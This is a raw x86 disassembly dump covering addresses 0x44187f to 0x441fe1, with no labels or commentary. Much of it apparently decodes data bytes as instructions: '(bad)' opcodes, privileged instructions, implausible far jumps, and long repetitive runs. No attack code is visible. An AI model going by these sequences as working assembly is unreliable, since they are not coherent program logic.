  44187f:	js     0x441899
  441881:	push   es
  441882:	pop    ss
  441883:	jo     0x44189d
  441885:	(bad)  
  441886:	push   ss
  441887:	dec    eax
  441888:	sbb    BYTE PTR [esi],dl
  44188a:	pop    ss
  44188b:	push   eax
  44188c:	sbb    BYTE PTR [esi],bl
  44188e:	pop    ss
  44188f:	cmp    BYTE PTR [eax],bl
  441891:	push   es
  441892:	pop    ss
  441893:	xor    BYTE PTR [eax],bl
  441895:	(bad)  
  441896:	push   ss
  441897:	sub    BYTE PTR [eax],bl
  441899:	mov    dh,0x16
  44189b:	xor    BYTE PTR [eax],bl
  44189d:	mov    esi,0xc6183816
  4418a2:	push   ss
  4418a3:	xor    BYTE PTR [eax],bl
  4418a5:	mov    esi,0x96184816
  4418aa:	push   ss
  4418ab:	push   eax
  4418ac:	sbb    BYTE PTR [esi-0x79e7c7ea],bl
  4418b2:	push   ss
  4418b3:	xor    BYTE PTR [eax],bl
  4418b5:	jle    0x4418cd
  4418b7:	call   0xf04e8ed7
  4418bc:	sbb    edi,DWORD PTR [esi+0xa]
  4418bf:	clc    
  4418c0:	sbb    eax,DWORD PTR [esi+0x1bf00a]
  4418c6:	add    BYTE PTR [eax],al
  4418c8:	add    BYTE PTR [eax],al
  4418ca:	jle    0x4418d6
  4418cc:	enter  0x961b,0xa
  4418d0:	rcr    BYTE PTR [ebx],1
  4418d2:	sahf   
  4418d3:	or     al,BYTE PTR [eax]
  4418d5:	mov    eax,0xbb37955e
  4418da:	pop    edi
  4418db:	test   DWORD PTR [esi],esi
  4418dd:	jge    0x44186f
  4418df:	mov    al,ds:0x1488d036
  4418e4:	ss es jg 0x44189c
  4418e8:	xor    eax,0x352f7f8c
  4418ed:	hlt    
  4418ee:	outs   dx,DWORD PTR ds:[esi]
  4418ef:	mov    ch,0x34
  4418f1:	shr    DWORD PTR [esi+0x5b],1
  4418f4:	xor    al,0x2d
  4418f6:	push   ebp
  4418f7:	mov    dh,0x3b
  4418f9:	adc    dl,BYTE PTR [ebp-0x53]
  4418fc:	cmp    edx,DWORD PTR ds:0x1d3bd095
  441902:	xchg   ebp,eax
  441903:	cmp    DWORD PTR [ebx],0x64
  441906:	xchg   ebp,eax
  441907:	jbe    0x441944
  441909:	jb     0x4418a0
  44190b:	xchg   esi,eax
  44190c:	cmp    ebp,DWORD PTR [ebx-0x6ec4c06b]
  441912:	xchg   ebp,eax
  441913:	dec    esi
  441914:	cmp    ebp,esi
  441916:	xchg   ebp,eax
  441917:	idiv   DWORD PTR [edx]
  441919:	leave  
  44191a:	xchg   ebp,eax
  44191b:	and    BYTE PTR [ebx],bh
  44191d:	sbb    dl,BYTE PTR [esp+edx*1+0x3b]
  441921:	stos   BYTE PTR es:[edi],al
  441922:	push   ebp
  441923:	lds    edi,FWORD PTR [edx]
  441925:	rcl    BYTE PTR [ebp-0x25],0x3a
  441929:	jl     0x44197f
  44192b:	lahf   
  44192c:	cmp    al,BYTE PTR [ebx+0x0]
  441932:	add    BYTE PTR [ecx+edi*1+0x3a],dl
  441936:	in     eax,dx
  441937:	push   0x60d639ea
  44193c:	mov    edi,0xdf589039
  441941:	cmp    DWORD PTR [edx+0x3a399b93],eax
  441947:	mov    esp,DWORD PTR [edi+0x39]
  44194a:	test   BYTE PTR [ebx+0x7bae38aa],0xe6
  441951:	cmp    BYTE PTR [eax],al
  441953:	shr    ah,cl
  441955:	cmp    BYTE PTR [edi],0x5c
  441958:	loope  0x441954
  44195a:	jmp    FWORD PTR [eax-0x7fffffa]
  441960:	lock jae 0x441993
  441963:	fcomi  st,st(0)
  441965:	shl    BYTE PTR [eax],cl
  441967:	jo     0x441960
  441969:	sub    esi,DWORD PTR [ecx]
  44196b:	xchg   eax,esi
  44196d:	inc    esp
  44196e:	xor    bh,BYTE PTR [eax+esi*8-0xcfecd7a]
  441975:	ret    
  441976:	xor    bl,al
  441978:	repnz leave 
  44197a:	xor    dh,BYTE PTR [ebx]
  44197c:	repz imul esi,DWORD PTR [ebx],0xffffffa6
  441980:	lock mov ds:0x1ff53334,al
  441986:	xor    eax,0x3588eb7d
  44198b:	inc    eax
  44198c:	jmp    0x35db:0xea2135c4
  441993:	(bad)  
  441994:	jmp    0x444f7a
  441999:	add    BYTE PTR [eax],al
  44199b:	add    BYTE PTR [edx+ebp*8-0x13],cl
  44199f:	xor    eax,0x3603ea48
  4419a4:	(bad)  
  4419a5:	test   BYTE PTR [edx],0x36
  4419a8:	jne    0x44199e
  4419aa:	sbb    DWORD PTR [esi],esi
  4419ac:	test   esp,esi
  4419ae:	and    eax,0x5ff6e436
  4419b3:	ss mov bl,0xf6
  4419b6:	fs ss shl esi,1
  4419ba:	jb     0x4419f2
  4419bc:	sbb    eax,0x1b367ef7
  4419c1:	test   DWORD PTR [esi+esi*1+0x36a3f72a],0x36b3f5c9
  4419cc:	aad    0xf5
  4419ce:	getsec 
  4419d0:	jne    0x441a4d
  4419d2:	adc    DWORD PTR [edx+eiz*4-0x2a],edi
  4419d6:	adc    DWORD PTR [ecx],ebx
  4419d8:	(bad)  
  4419d9:	fcom   QWORD PTR [ebx*4+0x2814be8d]
  4419e0:	jl     0x441968
  4419e2:	sbb    ecx,edx
  4419e4:	jl     0x441a4b
  4419e6:	push   ss
  4419e7:	xor    al,0x6f
  4419e9:	mov    eax,ds:0xc96fe715
  4419ee:	push   ss
  4419ef:	nop
  4419f0:	pusha  
  4419f1:	sbb    DWORD PTR [eax],0xffffffb7
  4419f4:	pop    eax
  4419f5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4419f6:	sbb    DWORD PTR [eax],eax
  4419f8:	jne    0x441a53
  4419fa:	dec    esp
  4419fb:	std    
  4419fc:	or     cl,BYTE PTR [edx-0x4]
  4419ff:	inc    DWORD PTR [eax]
  441a01:	add    BYTE PTR [eax],al
  441a03:	add    BYTE PTR [eax],al
  441a05:	jne    0x4419dc
  441a07:	adc    ebp,DWORD PTR [edi+0x44]
  441a0a:	cdq    
  441a0b:	or     al,0xde
  441a0d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  441a0e:	mov    ah,0xd
  441a10:	and    esp,DWORD PTR [ecx-0x5656efa1]
  441a16:	call   0xe17:0x7ba1f417
  441a1d:	lea    esp,[ecx+0x14]
  441a20:	pushf  
  441a21:	lea    eax,[edx*1+0x15ea7c6b]
  441a28:	ins    DWORD PTR es:[edi],dx
  441a29:	js     0x4419d8
  441a2b:	sbb    DWORD PTR [edi],ecx
  441a2d:	jb     0x441a88
  441a2f:	cld    
  441a30:	cld    
  441a31:	stos   BYTE PTR es:[edi],al
  441a32:	dec    ecx
  441a33:	cld    
  441a34:	push   DWORD PTR [ebp+0x4]
  441a37:	adc    al,0xc4
  441a39:	pop    ecx
  441a3a:	or     eax,0x59750020
  441a3f:	in     al,dx
  441a40:	cld    
  441a41:	mov    dl,BYTE PTR [ecx+0x75fffc]
  441a47:	or     eax,0xdd844f4
  441a4c:	xchg   esi,eax
  441a4d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  441a4e:	add    dh,BYTE PTR [ebx]
  441a50:	adc    ch,BYTE PTR [edi+ecx*1-0x10]
  441a54:	pop    ss
  441a55:	outs   dx,DWORD PTR ds:[esi]
  441a56:	push   ss
  441a57:	test   al,0x17
  441a59:	ja     0x441a70
  441a5b:	icebp  
  441a5c:	push   ss
  441a5d:	jecxz  0x441a74
  441a5f:	cmp    dl,BYTE PTR [edi]
  441a61:	or     dl,BYTE PTR ds:0x147215e2
  441a67:	xchg   esp,eax
  441a68:	adc    eax,0x0
  441a6d:	add    al,dl
  441a6f:	adc    al,0x7
  441a71:	push   ss
  441a72:	sbb    BYTE PTR [edi+edi*8],dl
  441a75:	adc    al,0x88
  441a77:	adc    edi,DWORD PTR [edi]
  441a79:	adc    eax,0x154913bc
  441a7e:	mov    ss,WORD PTR [ebx]
  441a80:	push   ebx
  441a81:	adc    eax,0x14651388
  441a86:	mov    BYTE PTR ds:0xcc81e8b,cl
  441a8c:	out    0x23,eax
  441a8e:	clc    
  441a8f:	dec    edx
  441a90:	push   es
  441a91:	add    al,0x75
  441a93:	add    dh,dh
  441a95:	adc    ch,BYTE PTR [ecx+0x10132e11]
  441a9b:	adc    eax,0x133016a8
  441aa0:	out    dx,eax
  441aa1:	sbb    edx,DWORD PTR [ebx+0xa]
  441aa4:	mov    dl,0x1b
  441aa6:	jb     0x441ab4
  441aa8:	push   ss
  441aa9:	push   ds
  441aaa:	lahf   
  441aab:	or     ah,bh
  441aad:	adc    edi,DWORD PTR [eax+0x7503424a]
  441ab3:	add    bh,dl
  441ab5:	adc    esi,DWORD PTR [edi+0x15]
  441ab8:	xchg   ecx,eax
  441ab9:	adc    eax,0x1af609de
  441abe:	leave  
  441abf:	pop    es
  441ac0:	xchg   edi,eax
  441ac1:	sbb    ecx,ecx
  441ac3:	pop    es
  441ac4:	jg     0x441adf
  441ac6:	leave  
  441ac7:	pop    es
  441ac8:	daa    
  441ac9:	sbb    DWORD PTR [ecx+0x5c210007],edi
  441acf:	ds xor eax,0x19
  441ad5:	add    BYTE PTR [eax],al
  441ad7:	mov    WORD PTR [esi],gs
  441ad9:	xor    eax,0x35268c41
  441ade:	or     DWORD PTR [esi+ebx*2+0x35],edi
  441ae2:	add    DWORD PTR [esi+edx*2+0x35],edi
  441ae6:	sbb    DWORD PTR [esi+ecx*2+0x35],ebp
  441aea:	add    DWORD PTR [esi+eax*2+0x35],ebp
  441aee:	jmp    0xe1791950
  441af3:	pop    ebp
  441af4:	div    BYTE PTR [ecx+ebx*8]
  441af7:	(bad)  
  441af8:	out    dx,al
  441af9:	xor    al,0x1
  441afb:	mov    ah,dh
  441afd:	xor    al,0x9
  441aff:	sbb    BYTE PTR [esi],0x35
  441b02:	add    DWORD PTR [edx+0x16],edi
  441b05:	xor    eax,0x350e7219
  441b0a:	(bad)  
  441b0b:	ins    DWORD PTR es:[edi],dx
  441b0c:	das    
  441b0d:	cmp    ecx,ebx
  441b0f:	pop    ebp
  441b10:	pop    esp
  441b11:	cmp    esi,DWORD PTR [ebx+0x93afc5d]
  441b17:	mov    WORD PTR [esi],ss
  441b19:	cmp    esp,eax
  441b1b:	lea    esi,[ecx-0x2983f6c6]
  441b21:	cmp    dl,BYTE PTR [ecx]
  441b23:	jl     0x441b9b
  441b25:	cmp    ch,BYTE PTR [edi+0x6c]
  441b28:	mov    al,ds:0x396c3e3a
  441b2d:	cmp    bl,BYTE PTR [edi+0x7f3a605c]
  441b33:	pop    esp
  441b34:	add    BYTE PTR [edx],bh
  441b36:	int    0x8c
  441b38:	sbb    bh,BYTE PTR [edx]
  441b3a:	sbb    al,0x0
  441b3c:	add    BYTE PTR [eax],al
  441b3e:	add    BYTE PTR [eax],al
  441b40:	(bad)  
  441b41:	mov    ch,0x39
  441b43:	retf   
  441b44:	jl     0x441b22
  441b46:	cmp    ebx,edx
  441b48:	jl     0x441bc6
  441b4a:	cmp    DWORD PTR [ecx+0x39966f],ecx
  441b50:	cmc    
  441b51:	in     al,dx
  441b52:	fidivr DWORD PTR [esi]
  441b54:	dec    ecx
  441b55:	in     al,dx
  441b56:	clc    
  441b57:	ds xchg ecx,eax
  441b59:	in     al,dx
  441b5a:	sub    BYTE PTR [edi],bh
  441b5c:	pop    esp
  441b5d:	inc    ebp
  441b5e:	sti    
  441b5f:	push   DWORD PTR [eax-0x2]
  441b62:	(bad)  
  441b63:	(bad)  
  441b64:	mov    esi,0x8f3b17e8
  441b69:	jmp    0x3ded:0xe9ec3d56
  441b70:	pop    eax
  441b71:	jmp    0x441b12
  441b73:	ds jle 0x441b62
  441b76:	(bad)  
  441b77:	dec    DWORD PTR [ebp+edx*4-0x5]
  441b7b:	inc    DWORD PTR [eax+0x5]
  441b7e:	add    BYTE PTR [eax],al
  441b80:	aas    
  441b81:	lock in al,dx
  441b83:	xor    ebx,DWORD PTR [ebx]
  441b85:	stc    
  441b86:	adc    BYTE PTR [esp+ecx*1],dh
  441b89:	hlt    
  441b8a:	cld    
  441b8b:	ss shl al,1
  441b8e:	inc    eax
  441b8f:	cmp    eax,0xffffeb69
  441b94:	or     al,0x65
  441b96:	sti    
  441b97:	inc    DWORD PTR [eax-0x2]
  441b9a:	(bad)  
  441b9b:	call   edi
  441b9d:	hlt    
  441b9e:	pop    edx
  441b9f:	xor    BYTE PTR [eax],al
  441ba1:	cmc    
  441ba2:	rdtsc  
  441ba4:	add    BYTE PTR [eax],al
  441ba6:	add    BYTE PTR [eax],al
  441ba8:	add    BYTE PTR [edi],bh
  441baa:	out    dx,al
  441bab:	(bad)  
  441bac:	xor    DWORD PTR [ebx],esp
  441bae:	out    dx,al
  441baf:	cmc    
  441bb0:	xor    DWORD PTR [eax-0x10],esi
  441bb3:	adc    eax,0x26f8b934
  441bb8:	xor    al,0x0
  441bba:	stc    
  441bbb:	mov    al,ds:0x2af3ab36
  441bc0:	aaa    
  441bc1:	mov    ?,ebp
  441bc3:	xor    al,0x38
  441bc5:	ret    
  441bc6:	in     al,dx
  441bc7:	mov    al,0x3a
  441bc9:	pop    ecx
  441bca:	out    0xc8,eax
  441bcc:	cmp    esi,DWORD PTR [ebp-0x3d]
  441bcf:	adc    al,dh
  441bd1:	push   ecx
  441bd2:	arpl   WORD PTR [edi],dx
  441bd4:	test   BYTE PTR [eax-0x2b],cl
  441bd7:	pop    ss
  441bd8:	inc    edx
  441bd9:	inc    ebx
  441bda:	xchg   edi,eax
  441bdb:	push   ss
  441bdc:	dec    esi
  441bdd:	cmp    esi,DWORD PTR [ebx+0x16]
  441be0:	pop    edx
  441be1:	mov    bl,0x3d
  441be3:	push   ss
  441be4:	gs stos DWORD PTR es:[edi],eax
  441be6:	imul   edx,DWORD PTR [esi],0x77
  441be9:	mov    ds:0x9b8116d9,eax
  441bee:	fist   WORD PTR [esi]
  441bf0:	xchg   ebx,eax
  441bf1:	xchg   ebx,eax
  441bf2:	(bad)  
  441bf3:	push   ss
  441bf4:	mov    ds:0xb716ae8b,eax
  441bf9:	sbb    DWORD PTR [ebx],0x17
  441bfc:	sar    DWORD PTR [ebx+0x1e],0x17
  441c00:	shl    DWORD PTR [ebx-0x7],1
  441c03:	push   ss
  441c04:	in     eax,0x6b
  441c06:	bound  edx,QWORD PTR ds:0x175d63fa
  441c0c:	or     DWORD PTR [eax],eax
  441c0e:	add    BYTE PTR [eax],al
  441c10:	add    BYTE PTR [eax],al
  441c12:	pop    edx
  441c13:	inc    edi
  441c14:	pop    ss
  441c15:	mov    ch,0x52
  441c17:	popf   
  441c18:	push   ss
  441c19:	add    BYTE PTR [ebp+0x59],dh
  441c1c:	int3   
  441c1d:	cld    
  441c1e:	add    dh,BYTE PTR [esi+0x8750003]
  441c24:	adc    al,0x83
  441c26:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  441c27:	cs or  eax,0xd20a42e
  441c2d:	test   BYTE PTR [ebp+ecx*8-0x7c5b64f4],ah
  441c34:	or     al,0x6c
  441c36:	xchg   ecx,ebp
  441c38:	adc    DWORD PTR [edi+eax*4-0x27],edi
  441c3c:	adc    DWORD PTR [edi+eax*4-0x7863ee57],ecx
  441c43:	mov    ecx,0x967ac11
  441c48:	adc    bh,BYTE PTR [edi+eiz*2-0x4ee9d8fe]
  441c4f:	adc    al,0x37
  441c51:	push   ss
  441c52:	mov    ecx,0xa1164714
  441c57:	adc    al,0x57
  441c59:	push   ss
  441c5a:	mov    DWORD PTR [edi+eiz*8],edx
  441c5d:	adc    al,0x71
  441c5f:	adc    edx,edi
  441c61:	adc    al,0x59
  441c63:	adc    eax,DWORD PTR [edi]
  441c65:	adc    eax,0x14f713a1
  441c6a:	test   eax,0xb114a713
  441c6f:	adc    esi,DWORD PTR [edi-0x78ec46ec]
  441c75:	adc    al,0x0
  441c77:	add    BYTE PTR [eax],al
  441c79:	add    BYTE PTR [eax],al
  441c7b:	loope  0x441c90
  441c7d:	xchg   edi,eax
  441c7e:	adc    al,0xc9
  441c80:	adc    esp,DWORD PTR [edi+0x15]
  441c83:	icebp  
  441c84:	adc    dl,BYTE PTR [edi+0x15]
  441c87:	fst    DWORD PTR [edx]
  441c89:	inc    edi
  441c8a:	adc    eax,0x43e70275
  441c8f:	sub    DWORD PTR [edi-0x3e],eax
  441c92:	add    esi,DWORD PTR [ebp+0x2]
  441c95:	out    0x13,eax
  441c97:	jno    0x441cab
  441c99:	sti    
  441c9a:	adc    ebp,DWORD PTR [ebp+0x12]
  441c9d:	sti    
  441c9e:	adc    esp,DWORD PTR [ebp-0x62eae4ed]
  441ca4:	adc    ebx,DWORD PTR [ebx]
  441ca6:	adc    eax,0x154b1395
  441cab:	pop    ebp
  441cac:	adc    edi,DWORD PTR [ebx]
  441cae:	adc    eax,0x151b1365
  441cb3:	pop    ebp
  441cb4:	adc    ebx,DWORD PTR [ebx]
  441cb6:	adc    eax,0x146b12f5
  441cbb:	std    
  441cbc:	adc    bl,BYTE PTR [ebx+0x14]
  441cbf:	in     eax,0x12
  441cc1:	pop    ebx
  441cc2:	adc    al,0xdd
  441cc4:	adc    bl,BYTE PTR [ebx+0x14]
  441cc7:	adc    eax,0x894d0013
  441ccc:	call   0x9d2c:0x92813d2c
  441cd3:	mov    DWORD PTR [edx+0x2e819d2c],ecx
  441cd9:	sub    al,0x4d
  441cdb:	imul   ecx,DWORD PTR [esi+0x2c],0xe5
  441ce2:	add    BYTE PTR [eax],al
  441ce4:	jp     0x441cd4
  441ce6:	xor    ecx,DWORD PTR ds:0xa5340e65
  441cec:	push   0xffffffae
  441cee:	xor    ecx,ebp
  441cf0:	or     dh,0x33
  441cf3:	gs jp  0x441d64
  441cf6:	xor    ecx,DWORD PTR [ebp+0x72]
  441cf9:	mov    ?,WORD PTR [ebx]
  441cfb:	and    eax,0xd332e6a
  441d00:	or     BYTE PTR [esi+0x33],0xe5
  441d04:	jnp    0x441cf4
  441d06:	xor    cl,ch
  441d08:	jae    0x441d18
  441d0a:	xor    esp,DWORD PTR [ebp-0x72cd5195]
  441d10:	or     esi,0x32
  441d13:	gs jnp 0x441d84
  441d16:	xor    cl,BYTE PTR [ebp-0x5acd717c]
  441d1c:	test   BYTE PTR [esi],ch
  441d1e:	xor    cl,ch
  441d20:	fs dec esi
  441d22:	xor    ah,ch
  441d24:	js     0x441d14
  441d26:	xor    DWORD PTR ds:0x25320e73,ecx
  441d2c:	imul   ebp,DWORD PTR [esi-0x317cb2cf],0x31
  441d33:	gs jnp 0x441da4
  441d36:	xor    DWORD PTR [ebp+0x73],ecx
  441d39:	mov    ?,WORD PTR [ecx]
  441d3b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  441d3c:	imul   ebp,DWORD PTR [esi],0x31
  441d3f:	lea    eax,[ebx+0x7be5314e]
  441d45:	out    dx,al
  441d46:	xor    BYTE PTR [eax],al
  441d48:	add    BYTE PTR [eax],al
  441d4a:	add    BYTE PTR [eax],al
  441d4c:	add    BYTE PTR [eax-0x6fc8cc0c],dh
  441d52:	cmc    
  441d53:	push   ebx
  441d54:	aaa    
  441d55:	xor    ch,0x73
  441d58:	aaa    
  441d59:	adc    ch,dh
  441d5b:	(bad)  
  441d5c:	aaa    
  441d5d:	hlt    
  441d5e:	cmc    
  441d5f:	fwait
  441d60:	aaa    
  441d61:	in     al,dx
  441d62:	cmc    
  441d63:	mov    ds:0xabf5f437,eax
  441d68:	aaa    
  441d69:	in     al,dx
  441d6a:	cmc    
  441d6b:	mov    bl,0x37
  441d6d:	hlt    
  441d6e:	cmc    
  441d6f:	mov    ebx,0xc3f54c37
  441d74:	aaa    
  441d75:	pop    esp
  441d76:	add    DWORD PTR [eax],eax
  441d78:	add    BYTE PTR [ecx+eax*1+0x0],bl
  441d7c:	add    BYTE PTR [ecx+eax*1+0x0],cl
  441d80:	add    BYTE PTR [ecx+eax*1+0x0],cl
  441d84:	add    BYTE PTR [ecx+eax*1+0x0],bl
  441d88:	add    BYTE PTR [ecx+eax*1+0x0],bl
  441d8c:	add    BYTE PTR [ecx+eax*1+0x0],cl
  441d90:	add    BYTE PTR [ecx+eax*1+0x0],cl
  441d94:	add    BYTE PTR [ecx+eax*1],bl
  441d97:	add    BYTE PTR [eax],al
  441d99:	sbb    al,0x1
  441d9b:	add    BYTE PTR [eax],al
  441d9d:	or     al,0x1
  441d9f:	add    BYTE PTR [eax],al
  441da1:	or     al,0x1
  441da3:	add    BYTE PTR [eax],al
  441da5:	sbb    al,0x1
  441da7:	add    BYTE PTR [eax],al
  441da9:	sbb    al,0x1
  441dab:	add    BYTE PTR [eax],al
  441dad:	or     al,0x1
  441daf:	add    BYTE PTR [eax],al
  441db1:	add    BYTE PTR [eax],al
  441db3:	add    BYTE PTR [eax],al
  441db5:	add    BYTE PTR [ecx+eax*1],cl
  441db8:	add    BYTE PTR [eax],al
  441dba:	fadd   QWORD PTR [eax]
  441dbc:	add    BYTE PTR [eax],al
  441dbe:	fadd   QWORD PTR [eax]
  441dc0:	add    BYTE PTR [eax],al
  441dc2:	int3   
  441dc3:	add    BYTE PTR [eax],al
  441dc5:	add    ah,cl
  441dc7:	add    BYTE PTR [eax],al
  441dc9:	add    BYTE PTR [ebp+0x5b],dh
  441dcc:	cld    
  441dcd:	push   DWORD PTR [ebp+0x5b]
  441dd0:	cld    
  441dd1:	push   DWORD PTR [ebp+0x5b]
  441dd4:	cld    
  441dd5:	push   DWORD PTR [ebp+0x5b]
  441dd8:	cld    
  441dd9:	push   DWORD PTR [ebp+0x5b]
  441ddc:	cld    
  441ddd:	push   DWORD PTR [ebp+0x5b]
  441de0:	cld    
  441de1:	push   DWORD PTR [ebp+0x5b]
  441de4:	cld    
  441de5:	push   DWORD PTR [ebp+0x5b]
  441de8:	cld    
  441de9:	push   DWORD PTR [ebp+0x5b]
  441dec:	cld    
  441ded:	push   DWORD PTR [ebp+0x5b]
  441df0:	cld    
  441df1:	push   DWORD PTR [ebp+0x5b]
  441df4:	cld    
  441df5:	push   DWORD PTR [ebp+0x5b]
  441df8:	cld    
  441df9:	push   DWORD PTR [ebp+0x59]
  441dfc:	cld    
  441dfd:	push   DWORD PTR [ebp+0x59]
  441e00:	cld    
  441e01:	push   DWORD PTR [ebp+0x59]
  441e04:	cld    
  441e05:	push   DWORD PTR [ebp+0x59]
  441e08:	cld    
  441e09:	push   DWORD PTR [ebp+0x59]
  441e0c:	cld    
  441e0d:	push   DWORD PTR [ebp+0x59]
  441e10:	cld    
  441e11:	push   DWORD PTR [ebp+0x59]
  441e14:	cld    
  441e15:	push   DWORD PTR [ebp+0x59]
  441e18:	cld    
  441e19:	inc    DWORD PTR [eax]
  441e1b:	add    BYTE PTR [eax],al
  441e1d:	add    BYTE PTR [eax],al
  441e1f:	jne    0x441e7a
  441e21:	cld    
  441e22:	push   DWORD PTR [ebp+0x59]
  441e25:	cld    
  441e26:	push   DWORD PTR [ebp+0x59]
  441e29:	cld    
  441e2a:	push   DWORD PTR [ebp+0x59]
  441e2d:	cld    
  441e2e:	push   DWORD PTR [ebp+0x59]
  441e31:	cld    
  441e32:	push   DWORD PTR [ebp+0x59]
  441e35:	cld    
  441e36:	push   DWORD PTR [ebp+0x59]
  441e39:	cld    
  441e3a:	push   DWORD PTR [ebp+0x59]
  441e3d:	cld    
  441e3e:	push   DWORD PTR [ebp+0x59]
  441e41:	cld    
  441e42:	push   DWORD PTR [ebp+0x59]
  441e45:	cld    
  441e46:	push   DWORD PTR [ebp+0x2]
  441e49:	out    0x3,eax
  441e4b:	jne    0x441e4f
  441e4d:	out    0x3,eax
  441e4f:	jne    0x441e53
  441e51:	out    0x3,eax
  441e53:	jne    0x441e57
  441e55:	out    0x3,eax
  441e57:	jne    0x441e5b
  441e59:	out    0x3,eax
  441e5b:	jne    0x441e5f
  441e5d:	out    0x3,eax
  441e5f:	jne    0x441e63
  441e61:	out    0x3,eax
  441e63:	jne    0x441e67
  441e65:	out    0x3,eax
  441e67:	jne    0x441e6b
  441e69:	out    0x3,eax
  441e6b:	jne    0x441e6f
  441e6d:	out    0x3,eax
  441e6f:	jne    0x441e73
  441e71:	out    0x3,eax
  441e73:	jne    0x441e77
  441e75:	out    0x3,eax
  441e77:	jne    0x441e7b
  441e79:	out    0x3,eax
  441e7b:	jne    0x441e7f
  441e7d:	out    0x3,eax
  441e7f:	jne    0x441e83
  441e81:	out    0x3,eax
  441e83:	add    BYTE PTR [eax],al
  441e85:	add    BYTE PTR [eax],al
  441e87:	add    BYTE PTR [ebp+0x2],dh
  441e8a:	out    0x3,eax
  441e8c:	jne    0x441e90
  441e8e:	out    0x3,eax
  441e90:	jne    0x441e94
  441e92:	out    0x3,eax
  441e94:	jne    0x441e98
  441e96:	out    0x3,eax
  441e98:	jne    0x441e9c
  441e9a:	out    0x3,eax
  441e9c:	jne    0x441ea0
  441e9e:	out    0x3,eax
  441ea0:	jne    0x441ea4
  441ea2:	out    0x3,eax
  441ea4:	jne    0x441ea8
  441ea6:	out    0x3,eax
  441ea8:	jne    0x441eac
  441eaa:	out    0x3,eax
  441eac:	jne    0x441eb0
  441eae:	out    0x3,eax
  441eb0:	jne    0x441eb4
  441eb2:	out    0x3,eax
  441eb4:	jne    0x441eb8
  441eb6:	out    0x3,eax
  441eb8:	jne    0x441ebc
  441eba:	out    0x3,eax
  441ebc:	jne    0x441ec0
  441ebe:	out    0x3,eax
  441ec0:	jne    0x441ec4
  441ec2:	out    0x3,eax
  441ec4:	jne    0x441ec8
  441ec6:	add    cl,ch
  441ec8:	jbe    0x441ecc
  441eca:	add    cl,ch
  441ecc:	jbe    0x441ed0
  441ece:	add    cl,ch
  441ed0:	jbe    0x441ed4
  441ed2:	add    cl,ch
  441ed4:	jbe    0x441ed8
  441ed6:	add    cl,ch
  441ed8:	jbe    0x441edc
  441eda:	add    cl,ch
  441edc:	jbe    0x441ee0
  441ede:	add    cl,ch
  441ee0:	jbe    0x441ee4
  441ee2:	add    cl,ch
  441ee4:	jbe    0x441ee8
  441ee6:	add    cl,ch
  441ee8:	jbe    0x441eec
  441eea:	add    cl,ch
  441eec:	add    BYTE PTR [eax],al
  441eee:	add    BYTE PTR [eax],al
  441ef0:	add    BYTE PTR [esi+0x2],dh
  441ef3:	add    cl,ch
  441ef5:	jbe    0x441ef9
  441ef7:	add    cl,ch
  441ef9:	jbe    0x441efd
  441efb:	add    cl,ch
  441efd:	jbe    0x441f01
  441eff:	add    cl,ch
  441f01:	jbe    0x441f05
  441f03:	add    cl,ch
  441f05:	jbe    0x441f09
  441f07:	add    cl,ch
  441f09:	jbe    0x441f0d
  441f0b:	add    cl,ch
  441f0d:	jbe    0x441f11
  441f0f:	add    cl,ch
  441f11:	jbe    0x441f15
  441f13:	add    cl,ch
  441f15:	jbe    0x441f19
  441f17:	add    cl,ch
  441f19:	jbe    0x441f1d
  441f1b:	add    cl,ch
  441f1d:	jbe    0x441f21
  441f1f:	add    cl,ch
  441f21:	jbe    0x441f25
  441f23:	add    cl,ch
  441f25:	jbe    0x441f29
  441f27:	add    cl,ch
  441f29:	jbe    0x441f2d
  441f2b:	add    cl,ch
  441f2d:	jbe    0x441f31
  441f2f:	add    cl,ch
  441f31:	jbe    0x441f35
  441f33:	add    cl,ch
  441f35:	jbe    0x441f39
  441f37:	add    cl,ch
  441f39:	jbe    0x441f3d
  441f3b:	add    cl,ch
  441f3d:	jbe    0x441f41
  441f3f:	add    cl,ch
  441f41:	jbe    0x441f45
  441f43:	add    BYTE PTR [eax],al
  441f45:	or     al,0x6
  441f47:	add    BYTE PTR [eax],al
  441f49:	fadd   QWORD PTR ds:0x5dc0000
  441f4f:	add    BYTE PTR [eax],al
  441f51:	int3   
  441f52:	add    eax,0x0
  441f57:	add    BYTE PTR [eax],al
  441f59:	add    ah,cl
  441f5b:	add    eax,0x5dc0000
  441f60:	add    BYTE PTR [eax],al
  441f62:	fadd   QWORD PTR ds:0x5cc0000
  441f68:	add    BYTE PTR [eax],al
  441f6a:	int3   
  441f6b:	add    eax,0x59c0000
  441f70:	add    BYTE PTR [eax],al
  441f72:	pushf  
  441f73:	add    eax,0x58c0000
  441f78:	add    BYTE PTR [eax],al
  441f7a:	mov    WORD PTR ds:0x59c0000,es
  441f80:	add    BYTE PTR [eax],al
  441f82:	pushf  
  441f83:	add    eax,0x58c0000
  441f88:	add    BYTE PTR [eax],al
  441f8a:	mov    WORD PTR ds:0x55c0000,es
  441f90:	add    BYTE PTR [eax],al
  441f92:	pop    esp
  441f93:	add    eax,0x54c0000
  441f98:	add    BYTE PTR [eax],al
  441f9a:	dec    esp
  441f9b:	add    eax,0x55c0000
  441fa0:	add    BYTE PTR [eax],al
  441fa2:	pop    esp
  441fa3:	add    eax,0x54c0000
  441fa8:	add    BYTE PTR [eax],al
  441faa:	dec    esp
  441fab:	add    eax,0x51c0000
  441fb0:	add    BYTE PTR [eax],al
  441fb2:	sbb    al,0x5
  441fb4:	add    BYTE PTR [eax],al
  441fb6:	or     al,0x5
  441fb8:	add    BYTE PTR [eax],al
  441fba:	or     al,0x5
  441fbc:	add    BYTE PTR [eax],al
  441fbe:	add    BYTE PTR [eax],al
  441fc0:	add    BYTE PTR [eax],al
  441fc2:	add    BYTE PTR [eax*1+0x2b750000],bl
  441fc9:	cld    
  441fca:	push   DWORD PTR [ebp+0x2b]
  441fcd:	cld    
  441fce:	push   DWORD PTR [ebp+0x2b]
  441fd1:	cld    
  441fd2:	push   DWORD PTR [ebp+0x2b]
  441fd5:	cld    
  441fd6:	push   DWORD PTR [ebp+0x2b]
  441fd9:	cld    
  441fda:	push   DWORD PTR [ebp+0x2b]
  441fdd:	cld    
  441fde:	push   DWORD PTR [ebp+0x2b]
  441fe1:	cld    
